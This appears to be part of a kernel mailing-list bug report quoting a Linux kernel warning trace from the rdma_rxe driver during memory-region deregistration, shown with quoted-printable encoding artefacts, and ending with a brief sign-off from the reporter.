> [??? 10???  4 21:32:44 2026] Tainted: [B]=3DBAD_PAGE, [D]=3DDIE, [W]=3DWA=
RN
> [??? 10???  4 21:32:44 2026] Hardware name: VMware, Inc. VMware Virtual P=
latform/440BX Desktop Reference Platform, BIOS 6.00 11/12/2020
> [??? 10???  4 21:32:44 2026] RIP: 0010:__rxe_cleanup+0x222/0x2a0 [rdma_rx=
e]
> [??? 10???  4 21:32:44 2026] Code: 84 f7 fe ff ff 4c 89 e7 e8 cb 80 58 c0=
 84 c0 0f 85 6f ff ff ff be d4 30 00 00 4c 89 e7 e8 36 d3 d2 c2 85 c0 0f 85=
 5a ff ff ff <0f> 0b eb 0c 2e 2e 2e 31 c0 e9 45 fe ff ff 0f 0b bd 92 ff ff =
ff e9
> [??? 10???  4 21:32:44 2026] RSP: 0018:ffffc90018acf608 EFLAGS: 00010246
> [??? 10???  4 21:32:44 2026] RAX: 0000000000000000 RBX: ffff88812f299400 =
RCX: 1ffff92003159eaa
> [??? 10???  4 21:32:44 2026] RDX: 1ffff11025e53285 RSI: 1ffff92003159eb0 =
RDI: ffff88812f299430
> [??? 10???  4 21:32:44 2026] RBP: 0000000000000001 R08: 1ffff11025e53287 =
R09: 1ffff11025e53288
> [??? 10???  4 21:32:44 2026] R10: 0000000000000003 R11: 0000000000000000 =
R12: ffff88812f299428
> [??? 10???  4 21:32:44 2026] R13: 0000000000000000 R14: ffff888141aa2f28 =
R15: 1ffff92003159ec1
> [??? 10???  4 21:32:44 2026] FS:  00007f4b976cd580(0000) GS:ffff888265a1d=
000(0000) knlGS:0000000000000000
> [??? 10???  4 21:32:44 2026] CS:  0010 DS: 0000 ES: 0000 CR0: 00000000800=
50033
> [??? 10???  4 21:32:44 2026] CR2: 00007f627fe8b000 CR3: 0000000159762004 =
CR4: 0000000000370ef0
> [??? 10???  4 21:32:44 2026] Call Trace:
> [??? 10???  4 21:32:44 2026]  <TASK>
> [??? 10???  4 21:32:44 2026]  ? __pfx___rxe_cleanup+0x10/0x10 [rdma_rxe]
> [??? 10???  4 21:32:44 2026]  rxe_dereg_mr+0x6b/0x160 [rdma_rxe]
> [??? 10???  4 21:32:44 2026]  ib_dereg_mr_user+0x109/0x2d0 [ib_core]
> [??? 10???  4 21:32:44 2026]  destroy_hw_idr_uobject+0x7e/0x160 [ib_uverb=
s_support]
> [??? 10???  4 21:32:44 2026]  uverbs_destroy_uobject+0xe2/0x770 [ib_uverb=
s_support]
> [??? 10???  4 21:32:44 2026]  uobj_destroy+0x70/0xf0 [ib_uverbs_support]
> [??? 10???  4 21:32:44 2026]  ib_uverbs_cmd_verbs+0xcf1/0x3300 [ib_uverbs]
> [??? 10???  4 21:32:44 2026]  ? __pfx_uverbs_destroy_def_handler+0x10/0x1=
0 [ib_core]
> [??? 10???  4 21:32:44 2026]  ? __tty_insert_flip_string_flags+0xfd/0x350
> [??? 10???  4 21:32:44 2026]  ? __pfx_ib_uverbs_cmd_verbs+0x10/0x10 [ib_u=
verbs]
> [??? 10???  4 21:32:44 2026]  ? queue_work_on+0x34/0x80
> [??? 10???  4 21:32:44 2026]  ? queue_work_on+0x73/0x80
> [??? 10???  4 21:32:44 2026]  ib_uverbs_ioctl+0x155/0x230 [ib_uverbs]
> [??? 10???  4 21:32:44 2026]  ? __pfx_ib_uverbs_ioctl+0x10/0x10 [ib_uverb=
s]
> [??? 10???  4 21:32:44 2026]  ? __pfx_ldsem_down_read+0x10/0x10
> [??? 10???  4 21:32:44 2026]  __x64_sys_ioctl+0x13c/0x1c0
> [??? 10???  4 21:32:44 2026]  do_syscall_64+0xe1/0x650
> [??? 10???  4 21:32:44 2026]  ? __wake_up+0x44/0x60
> [??? 10???  4 21:32:44 2026]  ? ldsem_up_read+0x17/0x60
> [??? 10???  4 21:32:44 2026]  ? file_tty_write.isra.0+0x4ad/0x790
> [??? 10???  4 21:32:44 2026]  ? vfs_write+0x554/0xde0
> [??? 10???  4 21:32:44 2026]  ? __pfx_vfs_write+0x10/0x10
> [??? 10???  4 21:32:44 2026]  ? do_syscall_64+0x11e/0x650
> [??? 10???  4 21:32:44 2026]  ? common_nsleep+0x6b/0xd0
> [??? 10???  4 21:32:44 2026]  ? fdget_pos+0x53/0x5e0
> [??? 10???  4 21:32:44 2026]  ? ksys_write+0x102/0x200
> [??? 10???  4 21:32:44 2026]  ? __pfx_ksys_write+0x10/0x10
> [??? 10???  4 21:32:44 2026]  ? __pfx___x64_sys_clock_nanosleep+0x10/0x10
> [??? 10???  4 21:32:44 2026]  ? fpregs_assert_state_consistent+0x5b/0xf0
> [??? 10???  4 21:32:44 2026]  ? do_syscall_64+0x11e/0x650
> [??? 10???  4 21:32:44 2026]  ? do_syscall_64+0x28e/0x650
> [??? 10???  4 21:32:44 2026]  ? do_syscall_64+0x98/0x650
> [??? 10???  4 21:32:44 2026]  ? clear_bhb_loop+0x40/0x90
> [??? 10???  4 21:32:44 2026]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
> [??? 10???  4 21:32:44 2026] RIP: 0033:0x7f4b978a31db
> [??? 10???  4 21:32:44 2026] Code: 00 48 89 44 24 18 31 c0 48 8d 44 24 60=
 c7 04 24 10 00 00 00 48 89 44 24 08 48 8d 44 24 20 48 89 44 24 10 b8 10 00=
 00 00 0f 05 <89> c2 3d 00 f0 ff ff 77 1c 48 8b 44 24 18 64 48 2b 04 25 28 =
00 00
> [??? 10???  4 21:32:44 2026] RSP: 002b:00007fff72261860 EFLAGS: 00000246 =
ORIG_RAX: 0000000000000010
> [??? 10???  4 21:32:44 2026] RAX: ffffffffffffffda RBX: 00007fff722619d8 =
RCX: 00007f4b978a31db
> [??? 10???  4 21:32:44 2026] RDX: 00007fff722619c0 RSI: 00000000c0181b01 =
RDI: 0000000000000003
> [??? 10???  4 21:32:44 2026] RBP: 00007fff722619a0 R08: 000055b0f4fb0ef0 =
R09: 000055b0f4fb0d80
> [??? 10???  4 21:32:44 2026] R10: 0000000000000000 R11: 0000000000000246 =
R12: 00007fff72261990
> [??? 10???  4 21:32:44 2026] R13: 0000000000000000 R14: 00007fff722619a0 =
R15: 000000000000001f
> [??? 10???  4 21:32:44 2026]  </TASK>
> [??? 10???  4 21:32:44 2026] ---[ end trace 0000000000000000 ]---

If the reproduction code for the issue is long, it can be placed in a link.

Thanks
Chenguang
